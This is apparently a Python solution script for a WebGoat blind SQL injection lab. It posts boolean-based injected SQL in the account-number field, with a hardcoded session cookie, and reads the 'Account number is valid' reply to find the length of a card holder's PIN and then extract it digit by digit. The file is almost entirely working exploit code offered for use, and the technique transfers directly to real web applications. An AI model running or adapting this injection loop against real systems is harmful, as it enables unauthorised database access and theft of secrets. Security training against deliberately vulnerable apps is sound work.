import requests

URL="http://192.168.10.50:8080/WebGoat/attack?Screen=1315528047&menu=1100"
cookie={
    "JSESSIONID":"9B42439A811AF840F234F484CD3580CC"
    }
session1=requests.Session()
num=0

while True :

    inject1='101 and length(select pin from pins where cc_number=1111222233334444)='+str(num)

    data1={
        'account_number':inject1,
        'SUBMIT':'Go!'      
        }

    res=session1.post(URL, cookies=cookie, data=data1)

    final=[]

    if (res.text.find("Account number is valid") >= 0) :
        print ("length : "+str(num))
        for i in range(1,num+1) :
            for j in range(10):
                inject2='101 and substr((select pin from pins where cc_number=1111222233334444),'+str(i)+',1)='+str(j)
                data2={
                    'account_number':inject2,
                    'SUBMIT':'Go!'    
                    }
                res2=session1.post(URL, cookies=cookie, data=data2)

                if (res2.text.find("Account number is valid") >= 0) :
                    final.insert(i, str(j))
                    print (final)
                    break
                else :
                    print("no final : "+str(i),str(j))
        print ("".join(final))
        exit (0)
    else :
        print ("no... "+str(num))
    num+=1
    

